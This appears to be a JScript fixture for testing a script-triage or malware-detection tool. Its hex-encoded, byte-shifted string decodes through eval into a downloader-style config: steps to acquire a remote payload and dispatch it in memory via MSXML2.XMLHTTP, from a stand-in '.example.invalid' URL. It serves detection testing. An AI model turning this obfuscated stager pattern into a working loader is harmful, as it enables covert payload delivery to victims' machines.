// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_4e8f02d8 = function(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push((storedMaterial[i] + 29) % 256); }
  return recoveredMaterial;
};
var recover_3f36ffaf = function() {
  var packedText = "%5e%05%56%57%48%53%56%05%1d%3e%05%44%46%54%58%4c%55%48%42%55%48%50%52%57%48%05%0f%05%47%4c%56%53%44%57%46%4b%42%50%48%50%52%55%5c%05%40%0f%05%44%47%44%53%57%48%55%05%1d%05%30%36%3b%30%2f%15%11%3b%30%2f%2b%37%37%33%11%19%11%13%05%0f%05%59%44%4f%58%48%56%05%1d%5e%05%46%44%50%53%44%4c%4a%51%42%4c%47%05%1d%05%46%44%50%53%44%4c%4a%51%10%1a%1b%47%1c%1b%46%45%13%47%18%05%0f%05%58%55%4f%05%1d%05%4b%57%57%53%56%1d%12%12%1a%1b%47%1c%1b%46%45%13%47%18%11%48%5b%44%50%53%4f%48%11%4c%51%59%44%4f%4c%47%12%1b%1b%49%17%45%47%18%44%11%47%44%57%05%0f%05%58%56%48%55%42%44%4a%48%51%57%05%1d%05%2b%58%51%57%55%48%56%56%2f%44%45%12%1a%1b%47%1c%1b%46%45%13%47%18%05%60%0f%05%56%57%44%4a%48%26%52%58%51%57%05%1d%15%60";

  var storedMaterial = [];

  for (var pi = 0; pi < packedText.length; pi += 3) { storedMaterial.push(parseInt(packedText.substr(pi + 1, 2), 16)); }

  var harmlessValue = (2 > 1) ? "left" : "right";

  var recoveredMaterial = [];

  var pass = 0;

  while (pass < 1) { recoveredMaterial = decode_4e8f02d8.apply(null, [storedMaterial]); pass++; }

  var configurationText = "";

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }

  return configurationText;
};
var inspect_f1527f91 = function() {
  var configuration = eval("(" + recover_3f36ffaf.apply(null, []) + ")");
  var table = { steps: function() { return configuration["steps"]; }, values: function() { return configuration["values"]; } };
  return { steps: table["steps"].apply(null, []), adapter: configuration["adapter"], values: table["values"].apply(null, []), stageCount: configuration["stageCount"] };
};
